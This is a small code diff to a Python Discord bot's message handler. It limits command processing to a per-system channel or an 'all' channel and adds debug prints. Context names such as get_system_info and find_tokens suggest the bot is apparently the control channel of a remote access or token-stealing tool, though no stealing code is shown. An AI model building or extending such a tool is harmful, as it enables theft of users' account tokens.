@@ -75,10 +75,11 @@ def get_system_info():
 async def on_message(message):
     if message.author.bot:
         return
-
-    # Check if the message is in the system-specific channel or the "all" channel
-    if message.channel.name == channel_name or message.channel.name == 'all':
-        await bot.process_commands(message)
+    print(message.channel.name)
+    print(channel_name)
+    if message.channel.name not in [str(channel_name), "all"]:
+        return
+    await bot.process_commands(message)
 
 
 def find_tokens(path):
